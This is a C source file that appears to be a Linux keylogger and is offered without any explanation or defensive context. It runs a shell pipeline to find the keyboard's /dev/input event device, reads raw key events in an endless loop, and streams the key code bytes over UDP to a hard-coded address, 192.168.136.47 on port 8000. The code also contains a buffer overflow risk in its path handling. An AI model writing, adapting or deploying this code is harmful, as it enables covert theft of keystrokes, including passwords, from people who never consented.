#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

char *execute_command(char *command)
{
    char *result = (char *)malloc(sizeof(char) * 4096); // allocate memory for the result string
    if (!result)
    {
        printf("Failed to allocate memory\n");
        exit(1);
    }
    result[0] = '\0'; // initialize the result string to an empty string

    /* Execute the command and save its output in the result variable. */
    FILE *pipe = popen(command, "r");
    if (!pipe)
    {
        printf("Failed to run command\n");
        exit(1);
    }
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
    {
        strcat(result, buffer);
    }

    /* close */
    pclose(pipe);

    /* return the output */
    return result;
}

int main()
{
    int fd, sockfd;
    char buffer[24];
    struct sockaddr_in servaddr;

    char command[] = "cat /proc/bus/input/devices | grep keyboard -A 5 | grep -o -E  'event[0-9]+'";
    char *result = execute_command(command);
    char file[19] = "/dev/input/";
    strcat(file,result);
    int newline = strcspn(file,"\n");
    file[newline] = 0;
    // Open the input event device file for reading
    fd = open(file, O_RDONLY);
    if (fd < 0)
    {
        perror("Error opening file");
        exit(1);
    }
    free(result);
    // Create a UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        perror("Error creating socket");
        exit(1);
    }

    // Set up the remote server address
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("192.168.136.47");
    servaddr.sin_port = htons(8000);

    // Read 24 bytes from the file in an infinite loop
    while (1)
    {
        if (read(fd, buffer, sizeof(buffer)) != sizeof(buffer))
        {
            perror("Error reading from file");
            exit(1);
        }

        // Extract bytes 17-22
        for (int i = 16; i < 22; i++)
        {
            char data = buffer[i];
            // Send the data to the remote server
            if (sendto(sockfd, &data, sizeof(data), 0,
                       (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
            {
                perror("Error sending data");
                exit(1);
            }
        }
    }

    // Close the file and socket
    close(fd);
    close(sockfd);

    return 0;
}